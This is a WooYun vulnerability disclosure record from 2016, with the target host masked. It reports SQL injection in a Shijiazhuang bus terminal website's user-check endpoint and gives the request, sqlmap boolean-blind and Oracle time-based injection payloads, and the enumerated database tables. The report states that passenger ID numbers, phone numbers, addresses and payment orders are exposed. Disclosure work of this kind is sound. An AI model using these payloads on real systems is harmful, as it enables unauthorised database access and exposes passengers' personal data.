{"id": 87706, "wybug_id": "wooyun-2016-0202480", "wybug_title": "石家庄客运总站某站点SQL注入(含旅客身份证号\\手机号\\住址\\订单时间去向)                                      ", "wybug_corp": "石家庄客运总站", "wybug_author": "路人甲", "wybug_date": "2016-04-27 20:10", "wybug_open_date": "2016-06-13 10:20", "wybug_type": "SQL注射漏洞", "wybug_level": "高", "wybug_rank_0": "15", "wybug_status": "已交由第三方合作机构(cncert国家互联网应急中心)处理", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["字符类型注射"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2016-04-27：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2016-04-29：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2016-05-09：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2016-05-19：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2016-05-29：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2016-06-13：\t细节向公众公开  简要描述： 石家庄客运总站某站点SQL注入(含旅客身份证号\\手机号\\住址\\订单时间去向) 详细说明：  \n**.**.**.**/Register.jsp\n\n\n检查用户是否存在\nGET **.**.**.**/CheckUserValue?userValue=test HTTP/1.1Accept: */*Accept-Language: zh-cnReferer: **.**.**.**/Register.jspAccept-Encoding: gzip, deflateUser-Agent: Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; .NET4.0C; .NET4.0E; LBBROWSER)Host: **.**.**.**Connection: Keep-AliveCookie: JSESSIONID=34130A0B9F153505167935FA37380FC3\nuserValue参数存在注入\n\n\n\n\n\n盲注，直接上SQLMAP   漏洞证明：  \nParameter: #1* (URI)    Type: boolean-based blind    Title: AND boolean-based blind - WHERE or HAVING clause    Payload: **.**.**.**:80/CheckUserValue?userValue=admin'and'1'='1' AND 9336=9336 AND 'CUrZ'='CUrZ    Type: AND/OR time-based blind    Title: Oracle AND time-based blind    Payload: **.**.**.**:80/CheckUserValue?userValue=admin'and'1'='1' AND 5097=DBMS_PIPE.RECEIVE_MESSAGE(CHR(66)||CHR(118)||CHR(85)||CHR(99),5) AND 'NaxB'='NaxB---back-end DBMS: Oraclecurrent schema (equivalent to database on Oracle):    'SJZWEB'\n\nDatabase: SJZWEB+-----------------------+---------+| Table                 | Entries |+-----------------------+---------+| TB_WEB_ERROR          | 2980653 || TB_WEB_USER_LOG       | 610631  || TB_WEB_LOG            | 422999  || TB_IMAGE_VALID        | 72548   || TB_WEB_ALIPAY         | 69898   || TB_WEB_SEAT_LOCK      | 33135   || TB_WEB_ORDER          | 26011   || TB_WEB_USER           | 16203   || TB_WEB_USER_ONLINE    | 13147   || TB_WEB_MSG_SEND       | 2033    || TB_WEB_ORDER_BUILD    | 1191    || TB_CITY               | 363     || TB_NEW_SCHEDULE       | 172     || TB_WEB_TICKETSALE_UPD | 125     || TB_WEB_ALL_ROUTE      | 101     || TB_PROVINCE           | 34      || TB_WEB_PARAMETER      | 13      || TB_WEB_AD             | 8       || TB_WEB_NEW_SCHEDULE   | 8       || TB_ANSWER_QUESTION    | 6       || TB_GATEWAY            | 1       || TB_WEB_DISCOUNT       | 1       || TB_WEB_SALE_SCHEDULE  | 1       || TB_WEB_SEATPASSWORD   | 1       |+-----------------------+---------+\n用户登陆日志包含用户ip，session\n\n用户订单界面，涵盖用户的支付宝订单号，出发地，登陆ip，付款金额，目的地站点名称等详细信息\n\n   修复方案：  过滤敏感字符   版权声明：转载请注明来源 路人甲@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：10  确认时间：2016-04-29 10:18 厂商回复： CNVD确认并复现所述漏洞情况，已经转由CNCERT下发给河北分中心，由河北分中心后续协调网站管理单位处置。  最新状态： 暂无  ", "replys": "漏洞评价：\n评价\n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 10, "Ranks": null}